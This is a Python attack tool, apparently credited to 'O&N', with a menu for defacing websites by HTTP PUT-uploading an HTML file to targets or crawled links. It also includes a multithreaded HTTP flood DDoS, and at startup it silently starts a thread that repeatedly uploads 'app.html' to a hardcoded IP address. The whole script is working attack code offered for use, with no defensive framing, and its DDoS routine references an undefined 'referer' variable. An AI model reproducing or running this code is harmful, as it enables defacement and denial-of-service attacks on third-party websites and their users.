# -*- coding: utf-8 -*-

import requests
import os.path
import urllib.request
import threading
import random
import os
import sys
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import time

try:
    import requests
    import os.path
    import random
    from bs4 import BeautifulSoup
except ImportError:
    exit("Install requests, beautifulsoup4 and try again...")

os.system("clear")

red = "\033[31m"
blue = "\033[34m"
bold = "\033[1m"
reset = "\033[0m"
green = "\033[32m"
yellow = "\033[33m"

colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]

color1, color2, color3, color4, color5 = random.sample(colors, 5)

banner = """
 ██████╗    ██╗   ███╗   ██╗
██╔═══██╗   ██║   ████╗  ██║
██║   ██║████████╗██╔██╗ ██║
██║   ██║██╔═██╔═╝██║╚██╗██║
╚██████╔╝██████║  ██║ ╚████║
 ╚═════╝ ╚═════╝  ╚═╝  ╚═══╝
 
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓

    [⍟] Tool Author: O&N

    [⍟] Discord: https://discord.gg/teHyE9Tgq7\t
   
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = input(tetew)
    return str(ipt)

def aox(script, target_url):
    op = open(script, "r").read()
    s = requests.Session()
    try:
        site = target_url.strip()
        if not site.startswith("http://"):
            site = "http://" + site
        req = s.put(site + "/" + script, data=op)
        if req.status_code > 200 or req.status_code >= 250:
            print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, script))
        else:
            print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, script))
    except requests.exceptions.RequestException:
        print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)

def find_links(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    links = []
    for link in soup.find_all('a'):
        href = link.get('href')
        if href:
            links.append(href)
    return links

def crawl_and_deface(site_url, deface_file):
    try:
        response = requests.get(site_url)
        if response.status_code == 200:
            links = find_links(response.content)
            for link in links:
                if link.startswith('/'):
                    link = urlparse(site_url).scheme + "://" + urlparse(site_url).netloc + link
                aox(deface_file, link)
        else:
            print("Failed to retrieve content from %s" % site_url)
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

def read_links_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            links = [line.strip() for line in file.readlines()]
            return links
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
        return []

def crawl_and_deface_links_from_file(deface_file, links_file):
    links = read_links_from_file(links_file)
    if not links:
        return

    for link in links:
        aox(deface_file, link)

def main(__bn__):
    print(__bn__)
    while True:
        try:
            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. DDoS\n4. Quit\n")
            if choice == "1":
                deface_single_site()
            elif choice == "2":
                crawl_and_deface_links()
            elif choice == "3":
                ddos()
            elif choice == "4":
                exit()
            else:
                print("Invalid option, please try again.")
        except KeyboardInterrupt:
            print("\nOperation cancelled.")

def deface_single_site():
    try:
        a = x(f"Enter your deface .html file: ")
        if not os.path.isfile(a):
            print("File '%s' not found" % a)
            return
        target_url = x(f"Enter the target site URL: ")
        aox(a, target_url)
    except KeyboardInterrupt:
        print()

def crawl_and_deface_links():
    try:
        a = x(f"Enter your deface .html file: ")
        if not os.path.isfile(a):
            print("File '%s' not found" % a)
            return
        links_file = x(f"Enter the path to the .txt file containing links: ")
        crawl_and_deface_links_from_file(a, links_file)
    except KeyboardInterrupt:
        print()

def ddos():
    try:
        os.system("clear" if sys.platform == "linux" or sys.platform == "linux2" else "cls")

        print("\033[1;32m")
        url = input("          URL: ").strip()
        print("\033[1;m")

        count = 0

        def useragent():
            headers = []
            headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
            headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
            headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
            headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
            return headers

        def ascii(size):
            out_str = ''

            for e in range(0, size):
                code = random.randint(65, 90)
                out_str += chr(code)
            return out_str

        class httpth1(threading.Thread):
            def run(self):
                nonlocal count
                while True:
                    try:
                        req = urllib.request.Request(url + "?" + ascii(random.randint(3, 10)))
                        req.add_header("User-Agent", random.choice(useragent()))
                        req.add_header("Referer", random.choice(referer))
                        urllib.request.urlopen(req)
                        count += 1
                        print("{0} Pure Dos Send".format(count))
                    except urllib.error.HTTPError:
                        print("\033[1;34m SERVER MIGHT BE DOWN \033[1;m")
                        pass
                    except urllib.error.URLError:
                        print("\033[1;34m URLERROR \033[1;m")
                        sys.exit()
                    except ValueError:
                        print("\033[1;34m [-]Check Your URL \033[1;m")
                        sys.exit()
                    except KeyboardInterrupt:
                        exit("\033[1;34m [-]Canceled By User \033[1;m")
                        sys.exit()

        while True:
            try:
                th1 = httpth1()
                th1.start()
            except Exception:
                pass
            except KeyboardInterrupt:
                exit("\033[1;34m [-]Canceled By User \033[1;m")

    except KeyboardInterrupt:
        print("\nExiting DDoS...")

def auto_upload(script, target_url, interval_ms):
    while True:
        aox(script, target_url)
        time.sleep(interval_ms / 1000)  # Convert interval to seconds

        
if __name__ == "__main__":
    banner = banner.replace("[⍟]", "[AUTO⍟]")
    interval_ms = 1  # Adjust the interval in milliseconds
    auto_upload_thread = threading.Thread(target=auto_upload, args=("app.html", "http://83.211.190.83", interval_ms))
    auto_upload_thread.start()
    main(banner)
